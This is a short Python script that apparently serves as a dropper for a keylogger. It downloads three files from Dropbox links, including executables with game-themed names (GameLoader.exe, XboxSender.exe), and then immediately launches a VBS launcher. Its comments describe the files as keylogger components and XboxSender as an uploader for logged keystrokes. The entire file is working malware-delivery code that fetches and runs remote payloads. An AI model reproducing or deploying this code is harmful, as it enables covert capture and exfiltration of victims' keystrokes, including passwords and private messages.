import requests
import os

def download_file(url, local_filename):
    response = requests.get(url, stream=True)

    # Checks for response code, if code 200 (which = good) then continues on.
    if response.status_code == 200:
        with open(local_filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    else: # error incase a download was failed, appointing to the URL that failed and response.status_code which tells us why it failed.
        print(f"Failed to download file: {url} (Status code: {response.status_code})")
        return False

# Path of download
downloads_folder = "C:/DownloadedFiles/"

# Links to downloading our keylogger files.
url1 = "https://www.dropbox.com/s/6rkwjkf0ncxoroq/GameLoader.exe?dl=1"
local_filename1 = os.path.join(downloads_folder, "GameLoader.exe")
url2 = "https://www.dropbox.com/s/uxsy8r4dyt42551/launcher.vbs?dl=1"
local_filename2 = os.path.join(downloads_folder, "launcher.vbs")
# The below is commented out since the XboxSender will need to be updated with a DropBox API key every 4 hours, therefore different code.
url3 = "https://www.dropbox.com/s/lcwqkibvey8cpij/XboxSender.exe?dl=1"
local_filename3 = os.path.join(downloads_folder, "XboxSender.exe")

if download_file(url1, local_filename1):
    print(f"Successfully downloaded: {local_filename1}")

if download_file(url2, local_filename2):
    print(f"Successfully downloaded: {local_filename2}")

if download_file(url3, local_filename3):
    print(f"Successfully downloaded: {local_filename3}")

# After download launcher.vbs is immediately launched, which will execute the XboxSender (report.txt a.k.a keylogger text file uploader)
vbs_file = os.path.join(downloads_folder, "launcher.vbs")
os.startfile(vbs_file)
